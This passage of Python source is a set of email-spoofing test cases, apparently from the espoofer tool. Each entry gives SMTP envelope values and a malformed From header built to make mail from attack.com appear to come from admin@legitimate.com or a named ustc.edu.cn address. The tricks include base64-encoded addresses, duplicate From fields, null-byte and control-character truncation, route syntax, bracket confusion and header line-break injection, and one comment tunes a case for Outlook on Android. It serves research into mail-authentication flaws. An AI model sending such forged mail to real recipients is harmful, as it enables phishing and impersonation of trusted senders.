            "from_header": b"From: " + bs64encode(b"<mjr2000@mail.ustc.edu.cn>") + b"\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: EXISTING / Extensions - A2.1 - Encode one address with base64" +  b"\r\n",
            # "body":   b" A2.1 test -- Encode one address with base64, thank you very much for your help!\r\n",
            "body": english_content.encode() + b'.\r\n',
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <admin@legitimate.com>\r\n; Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\n\r\n',
        }
    },
    # Combinations with 1st 
    "server_a2.2": {  
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        # "dkim_para": {"d":b"attack.com", "s":b"selector", "sign_header": b"From: <admin@legitimate.com>"},
        "data": {
            "from_header": b"From: " + bs64encode(b"<mjr2000@mail.ustc.edu.cn>, ") + b"<any@attack.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: NEW / Combinations with 1st - A2.2 - Encode one address with base64" +  b"\r\n",
            # "body":   b" A2.2 test -- Encode one address with multi-address, thank you very much for your help!\r\n",
            "body": english_content.encode() + b'.\r\n',
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <admin@legitimate.com>\r\n; Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\n\r\n',
        }
    },
    "server_a2.3": { 
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        # "dkim_para": {"d":b"attack.com", "s":b"selector", "sign_header": b"From: <admin@legitimate.com>"},
        "data": {
            "from_header": b"From: " + bs64encode(b"<mjr2000@mail.ustc.edu.cn>") + b"\r\nFrom: <any@attack.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: NEW / Combinations with 1st - A2.3 - Multi-From fields with encoded address" +  b"\r\n",
            # "body":   b" A2.3 test -- multi-from fields with encoded address, thank you very much for your help!\r\n",
            "body": english_content.encode() + b'.\r\n',
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <admin@legitimate.com>\r\n; Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\n\r\n',
        }
    },
    "server_a2.4": { 
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        # "dkim_para": {"d":b"attack.com", "s":b"selector", "sign_header": b"From: <admin@legitimate.com>"},
        "data": {
            "from_header": b"From: <any@attack.com>, " + bs64encode(b"<mjr2000@mail.ustc.edu.cn>") + b"\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: NEW / Combinations with 1st - A2.4 -From field includes multiple addresses with a encoded address" +  b"\r\n",
            # "body":   b" A2.4 test -- From field includes multiple addresses with a encoded address, thank you very much for your help!\r\n",
            "body": english_content.encode() + b'.\r\n',
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <admin@legitimate.com>\r\n; Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\n\r\n',
        }
    },
    "server_a2.5": { 
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        # "dkim_para": {"d":b"attack.com", "s":b"selector", "sign_header": b"From: <admin@legitimate.com>"},
        "data": {
            "from_header": b"From: <any@attack.com>\r\nFrom: " + bs64encode(b"<mjr2000@mail.ustc.edu.cn>") + b"\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: NEW / Combinations with 1st - A2.5 -Multi-From fields with encoded address" +  b"\r\n",
            # "body":   b" A2.5 test -- Multi-fom fields with encoded address, thank you very much for your help!\r\n",
            "body": english_content.encode() + b'.\r\n',
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <admin@legitimate.com>\r\n; Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\n\r\n',
        }
    },
    # Extensions 
    "server_a2.6": {  # EXISTING
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        # "dkim_para": {"d":b"attack.com", "s":b"selector", "sign_header": b"From: <admin@legitimate.com>"},
        "data": {
            "from_header": b"From: " + bs64encode(b"mjr2000@mail.ustc.edu.cn>") + b"\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: EXISTING / Extensions of 2nd - A2.6 - Encode one address with base64" +  b"\r\n",
            # "body":   b" A2.6 test -- Encode one address with base64, thank you very much for your help!\r\n",
            "body": english_content.encode() + b'.\r\n',
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <admin@legitimate.com>\r\n; Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\n\r\n',
        }
    },
    "server_a2.7": { # EXISTING
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        # "dkim_para": {"d":b"attack.com", "s":b"selector", "sign_header": b"From: <admin@legitimate.com>"},
        "data": {
            "from_header": b"From: " + bs64encode(b"mjr2000@mail.ustc.edu.cn") + b"\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: EXISTING / Extensions of 2nd - A2.7 - Encode one address with base64" +  b"\r\n",
            # "body":   b" A2.7 test -- Encode one address with base64, thank you very much for your help!\r\n",
            "body": english_content.encode() + b'.\r\n',
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <admin@legitimate.com>\r\n; Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\n\r\n',
        }
    },
# Character-3: From Truncation with special letters

    #The following are testing the usage of different letters in truncating the From field
    # Extensions
    "server_a3.1": {  # EXISTING  DELETE the first < when targeting Outlook on Android
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        # "dkim_para": {"d":b"attack.com", "s":b"selector", "sign_header": b"From: <admin@legitimate.com>"},
        "data": {
            "from_header": b"From: <admin@legitimate.com\0.attack.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: EXISTING / Extensions of the 3rd - A3.1 - From Truncation with terminator \\0" +  b"\r\n",
            # "body":   b" A3.1 test -- From Truncation with terminator, thank you very much for your help!\r\n",
            "body": english_content.encode() + b'.\r\n',
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <admin@legitimate.com>\r\n; Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\n\r\n',
        }
    },

    "server_a3.2": {  
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        # "dkim_para": {"d":b"attack.com", "s":b"selector", "sign_header": b"From: <admin@legitimate.com>"},
        "data": {
            "from_header": b"From: <admin@legitimate.com\'.attack.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: NEW / Extensions of the 3rd - A3.2 - From Truncation with a quote" +  b"\r\n",
            # "body":   b" A3.2 test -- From Truncation with a quote, thank you very much for your help!\r\n",
            "body": english_content.encode() + b'.\r\n',
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <admin@legitimate.com>\r\n; Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\n\r\n',
        }
    },

    "server_a3.3": {  
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        # "dkim_para": {"d":b"attack.com", "s":b"selector", "sign_header": b"From: <admin@legitimate.com>"},
        "data": {
            "from_header": b"From: <admin@legitimate.com>.attack.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: NEW / Extensions of the 3rd - A3.3 - From Truncation with a >" +  b"\r\n",
            # "body":   b" A3.3 test -- From Truncation with a >, thank you very much for your help!\r\n",
            "body": english_content.encode() + b'.\r\n',
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <admin@legitimate.com>\r\n; Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\n\r\n',
        }
    },

    "server_a3.4": {  # EXISTING
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        # "dkim_para": {"d":b"attack.com", "s":b"selector", "sign_header": b"From: <admin@legitimate.com>"},
        "data": {
            "from_header": b"From: <admin@legitimate.com\x01.attack.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: EXISTING / Extensions of the 3rd - A3.4 - From Truncation with unseen ASCII letters" +  b"\r\n",
            # "body":   b" A3.4 test -- From Truncation with unseen ASCII letters, thank you very much for your help!\r\n",
            "body": english_content.encode() + b'.\r\n',
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <admin@legitimate.com>\r\n; Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\n\r\n',
        }
    },
    "server_a3.5": {  
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        # "dkim_para": {"d":b"attack.com", "s":b"selector", "sign_header": b"From: <admin@legitimate.com>"},
        "data": {
            "from_header": b"From: <admin@legitimate.com.\x01attack.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: NEW / Extensions of the 3rd - A3.5 - From Truncation with unseen ASCII letters" +  b"\r\n",
            # "body":   b" A3.5 test -- From Truncation with unseen ASCII letters, thank you very much for your help!\r\n",
            "body": english_content.encode() + b'.\r\n',
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <admin@legitimate.com>\r\n; Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\n\r\n',
        },
        "description": b"A3.5- From Truncation with unseen ASCII letters"
    },
    "server_a3.6": {  # EXISTING
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        # "dkim_para": {"d":b"attack.com", "s":b"selector", "sign_header": b"From: <admin@legitimate.com>"},
        "data": {
            "from_header": b"From: <admin@legitimate.com\x01attack.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: EXISTING / Extensions of the 3rd - A3.6 - From Truncation with unseen ASCII letters" +  b"\r\n",
            # "body":   b" A3.6 test -- From Truncation with unseen ASCII letters, thank you very much for your help!\r\n",
            "body": english_content.encode() + b'.\r\n',
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <admin@legitimate.com>\r\n; Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\n\r\n',
        }
    },
# Character-4: From field in special format
    # Extensions
    "server_a4.1": {  # O
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        # "dkim_para": {"d":b"attack.com", "s":b"selector", "sign_header": b"From: <admin@legitimate.com>"},
        "data": {
            "from_header": b"From : <admin@legitimate.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: EXISTING / Extensions of the 4th - A4.1 - From field includes a fore space " +  b"\r\n",
            # "body":   b" A4.1 test -- From field includes a fore space, thank you very much for your help!\r\n",
            "body": english_content.encode() + b'.\r\n',
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <admin@legitimate.com>\r\n; Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\n\r\n',
        }
    },
    
    # From field includes a line break
    "server_a4.2": {  # O
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        # "dkim_para": {"d":b"attack.com", "s":b"selector", "sign_header": b"From: <admin@legitimate.com>"},
        "data": {
            "from_header": b"From: \n<admin@legitimate.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: EXISTING / Extensions of the 4th - A4.2 - From field includes a CR" +  b"\r\n",
            # "body":   b" A4.2 test -- From field includes a CR, thank you very much for your help!\r\n",
            "body": english_content.encode() + b'.\r\n',
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <admin@legitimate.com>\r\n; Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\n\r\n',
        },
        "description": b"A4.2 - From field includes a CR"
    },

    # From field includes a Space
    "server_a4.3": {  # EXISTING
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        # "dkim_para": {"d":b"attack.com", "s":b"selector", "sign_header": b"From: <admin@legitimate.com>"},
        "data": {
            "from_header": b"From: <@attack.com,@any.com:admin@legitimate.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: EXISTING / Extensions of the 4th - A4.3 - From field includes the route information" +  b"\r\n",
            # "body":   b" A4.3 test -- From field includes the route information, thank you very much for your help!\r\n",
            "body": english_content.encode() + b'.\r\n',
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <admin@legitimate.com>\r\n; Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\n\r\n',
        },
        "description": b"A4.3 - From field includes the route information"
    },

    # Parsing From field with angle brackets
    "server_a4.4": {  # EXISTING
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        #"dkim_para": {"d":b'attack.com', "s":b"selector", "sign_header": b"From: admin@legitimate.com, any@attack.com>"},
        "data": {
            "from_header": b"From: <ad><min@legitimate.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: EXISTING / Extensions of the 4th - A4.4 - Parsing From field with angle brackets" + b"\r\n",
            # "body": b"This is a spoofed email, please ide ntify it carefully! thank you very much for your help!" +  b"\r\n",
            "body": english_content.encode() + b'.\r\n',
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <admin@legitimate.com>\r\n; Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\n\r\n',
        },
        "description": b"A4.4 - Parsing From field with angle brackets"
    },

    "server_a4.5": { 
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        #"dkim_para": {"d":b'attack.com', "s":b"selector", "sign_header": b"From: admin@legitimate.com, any@attack.com>"},
        "data": {
            "from_header": b"From: <(any@attack.com)admin@legitimate.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: NEW / Extensions of the 4th - A4.5 - Parsing From field with parenthesis" + b"\r\n",
            # "body": b"A4.5 test -- Parsing From field with parenthesis, thank you very much for your help!" +  b"\r\n",
            "body": english_content.encode() + b'.\r\n',
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <admin@legitimate.com>\r\n; Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\n\r\n',
        },
        "description": b"A4.5 - Parsing From field with parenthesis"
    },

    "server_a4.6": { 
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        #"dkim_para": {"d":b'attack.com', "s":b"selector", "sign_header": b"From: admin@legitimate.com, any@attack.com>"},
        "data": {
            "from_header": b"From: <><admin@legitimate.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: NEW / Extensions of the 4th - A4.6 - From field includes an empty address" + b"\r\n",
            # "body": b"A4.6 test -- From field includes an empty address, thank you very much for your help!" +  b"\r\n",
            "body": english_content.encode() + b'.\r\n',
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <admin@legitimate.com>\r\n; Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\n\r\n',
        },
        "description": b"A4.6 - From field includes an empty address"
    },
    "server_a4.7": { 
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        #"dkim_para": {"d":b'attack.com', "s":b"selector", "sign_header": b"From: admin@legitimate.com, any@attack.com>"},
        "data": {
            "from_header": b"From: <>admin@legitimate.com\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: NEW / Extensions of the 4th - A4.7 -From field includes an empty address" + b"\r\n",
            # "body": b"A4.7 test -- From field includes an empty address, thank you very much for your help!" +  b"\r\n",
            "body": english_content.encode() + b'.\r\n',
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <admin@legitimate.com>\r\n; Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\n\r\n',
        }
    },
    "server_a4.8":{  # EXISTING
        "helo": b"attack.com",
        "mailfrom": b"<user@attack.com>",
        "rcptto": b"<victim@victim.com>",
        "data": {
            "from_header": b"From: admin@legitimate.com",
            "to_header": b" <victim@victim.com>\r\n",
            "subject_header": b"Subject: EXISTING / Extensions of the 4th - A4.8 -Delete the \r\n in From field" + b"\r\n",
            # "body": b"A4.8 test: From not truncated without Sender. Thank you very much for your help!" + b"\r\n",
            "body": english_content.encode() + b'.\r\n',
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <admin@legitimate.com>\r\n; Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n',
        }
    },

}